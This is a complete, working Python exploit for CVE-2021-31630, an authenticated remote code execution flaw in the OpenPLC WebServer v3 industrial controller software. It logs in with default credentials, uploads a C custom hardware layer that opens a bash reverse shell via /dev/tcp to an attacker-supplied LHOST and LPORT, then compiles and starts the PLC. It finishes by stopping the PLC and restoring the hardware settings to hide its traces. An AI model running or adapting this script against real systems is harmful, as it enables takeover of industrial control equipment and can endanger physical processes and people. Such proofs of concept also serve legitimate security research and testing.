#!/usr/bin/env python3

import sys
import argparse
import requests
from time import sleep

def parse_args():
    parser = argparse.ArgumentParser(description='OpenPLC WebServer v3 - Authenticated RCE (CVE-2021-31630)')
    parser.add_argument('url', help='Target URL with http(s)://')
    parser.add_argument('-u', help='Username', default='openplc')
    parser.add_argument('-p', help='Password', default='openplc')
    parser.add_argument('-t', help='Request Timeout, increase if server is slow', type=int, default=20)
    parser.add_argument('-lh', help='LHOST', required=True)
    parser.add_argument('-lp', help='LPORT', required=True)
    return parser.parse_args()

def check_service_status(session, target, timeout):
    response = session.get(target, timeout=timeout)
    if response.status_code == 200:
        print('[+] Service is Online!')
    else:
        print(f'[-] Status: {response.status_code}')
        sys.exit()

def login(session, url, username, password, timeout):
    payload = {'username': username, 'password': password}
    response = session.post(url, data=payload, timeout=timeout)
    if response.status_code == 200 and 'Bad credentials' not in response.text:
        print('[+] Logged in!')
    else:
        print(f'[-] Login failed with status: {response.status_code}')
        sys.exit()

def upload_payload(session, url, lhost, lport, timeout):
    template = f'''
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int ignored_bool_inputs[] = {{-1}};
int ignored_bool_outputs[] = {{-1}};
int ignored_int_inputs[] = {{-1}};
int ignored_int_outputs[] = {{-1}};

void initCustomLayer() {{}}

void updateCustomIn() {{}}

#define LHOST "{lhost}"
#define LPORT "{lport}"

void updateCustomOut()
{{
    int pipefd[2];
    pid_t pid;

    if (pipe(pipefd) == -1) {{
        exit(EXIT_FAILURE);
    }}

    pid = fork();
    if (pid == -1) {{
        exit(EXIT_FAILURE);
    }}

    if (pid == 0) {{
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        execl("/bin/bash", "/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/" LHOST "/" LPORT " 0>&1 &", NULL);
        exit(EXIT_FAILURE);
    }} else {{
        close(pipefd[1]);
        wait(NULL);
    }}
}}
'''
    files = {'hardware_layer': (None, b'blank_linux'), 'custom_layer_code': (None, template.encode())}
    response = session.post(url, files=files, timeout=timeout)
    if response.status_code == 200:
        print('[+] Payload uploaded!')
        return True
    print(f'[-] Upload failed with status: {response.status_code}')
    return False

def compile_program(session, url, timeout):
    response = session.get(url, timeout=timeout)
    if response.status_code == 200:
        print('[+] Compilation successful!')
        return True
    print(f'[-] Compilation failed with status: {response.status_code}')
    return False

def start_plc(session, url, timeout):
    response = session.get(url, timeout=timeout)
    if response.status_code == 200:
        print('[+] PLC Started! Check listener...')
        return True
    print(f'[-] PLC start failed with status: {response.status_code}')
    return False

def stop_plc(session, url, timeout):
    response = session.get(url, timeout=timeout)
    if response.status_code == 200:
        print('[+] PLC Stopped!')
        return True
    print(f'[-] PLC stop failed with status: {response.status_code}')
    return False

def restore_hardware(session, url, timeout):
    response = session.get(url, timeout=timeout)
    if response.status_code == 200:
        print('[+] Hardware restored!')
        return True
    print(f'[-] Hardware restore failed with status: {response.status_code}')
    return False

def main():
    args = parse_args()
    session = requests.Session()

    target = args.url.rstrip('/')
    if not target.startswith(('http://', 'https://')):
        print('[-] Invalid target, URL expected.')
        sys.exit()

    login_url = f'{target}/login'
    upload_url = f'{target}/hardware'
    compile_url = f'{target}/compile-program?file=blank_program.st'
    stop_url = f'{target}/stop_plc'
    start_url = f'{target}/start_plc'
    restore_url = f'{target}/restore_custom_hardware'

    print(f'''
    CVE-2021-31630 

[>] Found By : Fellipe Oliveira
[>] PoC By   : https://github.com/Samyajit0110

[>] Target   : {target}
[>] Username : {args.u}
[>] Password : {args.p}
[>] Timeout  : {args.t} secs
[>] LHOST    : {args.lh}
[>] LPORT    : {args.lp}
''')

    try:
        print('[!] Checking status...')
        check_service_status(session, target, args.t)
        print('[!] Logging in...')
        login(session, login_url, args.u, args.p, args.t)
        print('[!] Restoring default program...')
        if restore_hardware(session, restore_url, args.t):
            sleep(10)
            print('[!] Uploading payload...')
            if upload_payload(session, upload_url, args.lh, args.lp, args.t):
                sleep(5)
                print('[!] Compiling program...')
                if compile_program(session, compile_url, args.t):
                    sleep(5)
                    print('[!] Starting PLC...')
                    if start_plc(session, start_url, args.t):
                        print('[!] Cleaning up...')
                        sleep(1)
                        stop_plc(session, stop_url, args.t)
                        restore_hardware(session, restore_url, args.t)
    except Exception as e:
        print(f'[-] Exception: {e}')
        sys.exit()
    except KeyboardInterrupt:
        print('[!] Exiting...')
        sys.exit()

if __name__ == '__main__':
    main()
